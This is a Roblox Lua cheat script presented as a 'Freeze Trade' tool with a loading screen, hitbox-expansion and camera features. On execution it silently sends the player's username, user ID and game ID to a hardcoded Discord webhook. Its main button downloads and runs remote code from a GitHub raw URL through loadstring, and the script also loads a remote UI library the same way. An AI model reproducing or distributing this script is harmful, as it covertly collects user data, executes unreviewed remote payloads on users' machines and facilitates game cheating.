local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local Workspace = game:GetService("Workspace")

local player = Players.LocalPlayer
local GameID = game.PlaceId
local PlayerName = player.Name
local PlayerID = player.UserId

-- =============================================
-- 📡 WEBHOOK NOTIFICATION
-- =============================================
local WebhookURL = "https://discord.com/api/webhooks/1484224630465233080/nnuq3IeN8iVyWZJKoyJ8nRtG7pNgStp0HpM1VxfjZk5hN0kCMqg5UxFThOHpD_gpcOIe"

local data = {
    embeds = {{
        title = "🚀 SCRIPT EXECUTED!",
        color = 0x00ffff,
        fields = {
            {name = "👤 Username", value = "`"..PlayerName.."`", inline = true},
            {name = "🆔 User ID", value = "`"..PlayerID.."`", inline = true},
            {name = "🎮 Game ID", value = "`"..GameID.."`", inline = true},
        },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }}
}

local jsonData = HttpService:JSONEncode(data)
pcall(function()
    HttpService:PostAsync(WebhookURL, jsonData, Enum.HttpContentType.ApplicationJson)
end)

-- =============================================
-- 🎨 THEME
-- =============================================
local Theme = {
    BG = Color3.fromRGB(8, 8, 12),
    Panel = Color3.fromRGB(15, 15, 25),
    Primary = Color3.fromRGB(0, 255, 255),
    Secondary = Color3.fromRGB(138, 43, 226),
    Text = Color3.fromRGB(255, 255, 255)
}

-- =============================================
-- ✨ LOADING SCREEN
-- =============================================
local Loader = Instance.new("ScreenGui")
Loader.Name = "PremiumLoader"
Loader.ResetOnSpawn = false
Loader.Parent = player.PlayerGui
Loader.IgnoreGuiInset = true

local MainBG = Instance.new("Frame")
MainBG.Size = UDim2.new(1,0,1,0)
MainBG.BackgroundColor3 = Theme.BG
MainBG.Parent = Loader

local Gradient = Instance.new("UIGradient")
Gradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Theme.Primary),
    ColorSequenceKeypoint.new(1, Theme.Secondary)
}
Gradient.Rotation = 45
Gradient.Parent = MainBG

local Center = Instance.new("Frame")
Center.Size = UDim2.new(0, 600, 0, 400)
Center.Position = UDim2.new(0.5, -300, 0.5, -200)
Center.BackgroundTransparency = 1
Center.Parent = MainBG

local Logo = Instance.new("TextLabel")
Logo.Size = UDim2.new(1,0,0,120)
Logo.BackgroundTransparency = 1
Logo.Text = "❄️ FREEZE TRADE ❄️"
Logo.TextColor3 = Theme.Text
Logo.TextScaled = true
Logo.Font = Enum.Font.GothamBlack
Logo.Parent = Center

local SubText = Instance.new("TextLabel")
SubText.Size = UDim2.new(1,0,0,40)
SubText.Position = UDim2.new(0,0,0.35,0)
SubText.BackgroundTransparency = 1
SubText.Text = "ULTIMATE EDITION"
SubText.TextColor3 = Theme.Primary
SubText.TextScaled = true
SubText.Font = Enum.Font.Gotham
SubText.Parent = Center

local BarOutline = Instance.new("Frame")
BarOutline.Size = UDim2.new(0, 500, 0, 20)
BarOutline.Position = UDim2.new(0.5, -250, 0.6, 0)
BarOutline.BackgroundColor3 = Theme.Panel
BarOutline.Parent = Center

local BarCorner = Instance.new("UICorner")
BarCorner.CornerRadius = UDim.new(1,0)
BarCorner.Parent = BarOutline

local ProgressBar = Instance.new("Frame")
ProgressBar.Size = UDim2.new(0,0,1,0)
ProgressBar.BackgroundColor3 = Theme.Text
ProgressBar.Parent = BarOutline

local BarFill = Instance.new("UICorner")
BarFill.CornerRadius = UDim.new(1,0)
BarFill.Parent = ProgressBar

local PercentText = Instance.new("TextLabel")
PercentText.Size = UDim2.new(0,100,0,30)
PercentText.Position = UDim2.new(0.5, -50, 0.7, 0)
PercentText.BackgroundTransparency = 1
PercentText.Text = "0%"
PercentText.TextColor3 = Theme.Text
PercentText.TextScaled = true
PercentText.Font = Enum.Font.GothamBold
PercentText.Parent = Center

-- LOADING ANIMATION
local LoadTime = 10
local Elapsed = 0
local Conn

Conn = RunService.RenderStepped:Connect(function(delta)
    Elapsed += delta
    local Prog = math.min(Elapsed / LoadTime, 1)
    
    ProgressBar.Size = UDim2.new(Prog, 0, 1, 0)
    PercentText.Text = math.floor(Prog * 100).."%"
    
    if Prog >= 1 then
        Conn:Disconnect()
        local Fade = TweenInfo.new(0.8, Enum.EasingStyle.Quad)
        
        TweenService:Create(MainBG, Fade, {BackgroundTransparency = 1}):Play()
        TweenService:Create(Logo, Fade, {TextTransparency = 1}):Play()
        TweenService:Create(SubText, Fade, {TextTransparency = 1}):Play()
        TweenService:Create(BarOutline, Fade, {BackgroundTransparency = 1}):Play()
        TweenService:Create(PercentText, Fade, {TextTransparency = 1}):Play()
        
        task.wait(1)
        Loader:Destroy()
        LoadMainGUI()
    end
end)

-- =============================================
-- ⚙️ FEATURES
-- =============================================
local HitboxParts = {}
local HitboxSize = 8
local POV_Distance = 9
local POV_Height = 4

local function EnableHitbox()
    for _, v in pairs(Workspace:GetChildren()) do
        if v:FindFirstChild("Humanoid") and v ~= player.Character then
            local HRP = v:FindFirstChild("HumanoidRootPart")
            if HRP then
                local Box = Instance.new("Part")
                Box.Size = Vector3.new(HitboxSize, HitboxSize, HitboxSize)
                Box.Position = HRP.Position
                Box.Anchored = false
                Box.CanCollide = false
                Box.Transparency = 0.7
                Box.BrickColor = BrickColor.new("Cyan")
                Box.Material = Enum.Material.ForceField
                Box.Parent = HRP
                
                local Weld = Instance.new("Weld")
                Weld.Part0 = HRP
                Weld.Part1 = Box
                Weld.C0 = CFrame.new(0,0,0)
                Weld.Parent = Box
                
                table.insert(HitboxParts, Box)
            end
        end
    end
end

local function DisableHitbox()
    for _, v in pairs(HitboxParts) do
        if v then v:Destroy() end
    end
    HitboxParts = {}
end

local function ChangeView()
    local Cam = Workspace.CurrentCamera
    local Char = player.Character
    if not Char then return end
    
    local HRP = Char:FindFirstChild("HumanoidRootPart")
    if not HRP then return end
    
    Cam.CameraType = Enum.CameraType.Scriptable
    Cam.CFrame = Char.Head.CFrame
    Cam.FieldOfView = 90
    
    task.wait(2)
    
    TweenService:Create(Cam, TweenInfo.new(1.2, Enum.EasingStyle.Elastic), {
        CFrame = HRP.CFrame * CFrame.new(0, POV_Height, -POV_Distance),
        FieldOfView = 70
    }):Play()
end

-- =============================================
-- 🖥️ MAIN GUI
-- =============================================
function LoadMainGUI()
    local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
    
    local Window = Rayfield:CreateWindow({
        Name = "❄️ FREEZE TRADE • V3",
        LoadingTitle = "Baddies Ultimate",
        LoadingSubtitle = "by Legitness",
        ConfigurationSaving = {Enabled = false},
        Discord = {Enabled = false},
        KeySystem = false
    })

    -- TABS
    local Home = Window:CreateTab("🏠 Home", 4483362458)
    local Tools = Window:CreateTab("🔧 Tools", 4483362458)
    local Config = Window:CreateTab("⚙️ Config", 4483362458)

    -- HOME TAB
    Home:CreateSection("MAIN FEATURES")
    
    Home:CreateButton({
        Name = "🧊 ACTIVATE FREEZE TRADE",
        Callback = function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/freezebaddies-script/best-script/refs/heads/main/Baddies", true))()
            Rayfield:Notify({Title = "✅ ACTIVATED!", Content = "Freeze Trade Running", Duration = 2.5})
        end,
    })

    -- TOOLS TAB
    Tools:CreateSection("PLAYER TOOLS")
    
    Tools:CreateButton({
        Name = "📦 ENABLE HITBOX",
        Callback = function()
            EnableHitbox()
            Rayfield:Notify({Title = "Hitbox ON", Content = "Size: "..HitboxSize, Duration = 2})
        end,
    })
    
    Tools:CreateButton({
        Name = "🎥 CHANGE CAMERA VIEW",
        Callback = function()
            ChangeView()
            Rayfield:Notify({Title = "View Changed!", Duration = 1.5})
        end,
    })
    
    Tools:CreateButton({
        Name = "❌ DISABLE HITBOX",
        Callback = function()
            DisableHitbox()
            Rayfield:Notify({Title = "Hitbox OFF", Duration = 2})
        end,
    })

    -- CONFIG TAB
    Config:CreateSection("ADJUST SETTINGS")
    
    Config:CreateSlider({
        Name = "📏 Hitbox Size",
        Range = {2, 20},
        Increment = 1,
        CurrentValue = HitboxSize,
        Callback = function(val)
            HitboxSize = val
            DisableHitbox()
            EnableHitbox()
        end,
    })
    
    Config:CreateSlider({
        Name = "🔭 Camera Distance",
        Range = {5, 25},
        Increment = 1,
        CurrentValue = POV_Distance,
        Callback = function(val)
            POV_Distance = val
        end,
    })
    
    Config:CreateSlider({
        Name = "↕️ Camera Height",
        Range = {1, 12},
        Increment = 1,
        CurrentValue = POV_Height,
        Callback = function(val)
            POV_Height = val
        end,
    })

    Rayfield:Notify({
        Title = "🚀 WELCOME TO FREEZE TRADE",
        Content = "Script is Updated & Ready!",
        Duration = 4
    })
end
